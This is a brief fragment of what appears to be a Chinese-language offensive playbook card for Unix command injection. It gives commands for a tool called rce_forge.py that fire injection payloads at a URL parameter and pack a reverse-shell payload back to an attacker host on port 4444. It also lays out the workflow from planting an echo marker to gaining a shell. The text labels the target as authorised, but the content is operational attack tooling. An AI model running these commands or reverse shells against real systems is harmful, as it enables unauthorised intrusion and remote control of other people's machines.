...
python3 炼蛊房/rce_forge.py shoot --family cmdi-unix --url 'https://授权/?host=1' --param host --case <案>
python3 炼蛊房/rce_forge.py pack --case <案> --lhost <攻击机> --lport 4444 --rev
```

先打回显标记 `se9359`，再 `--exec` / `rce_forge shoot` 打穿。作业手法：`传承/奴道驱使.md` · `全力以赴-炼法.md`。  
未认形的「抢 RCE / getshell」先 `rce-encyclopedia` · `rce_family_route.py`。写文件/DNSlog ≠ GetShell。  
SSTI / Java 表达式不是本卡。
...
- 手法：`传承/奴道驱使.md`
- 工具：`python3 炼蛊房/tpl_inject_probe.py cmdi --help`
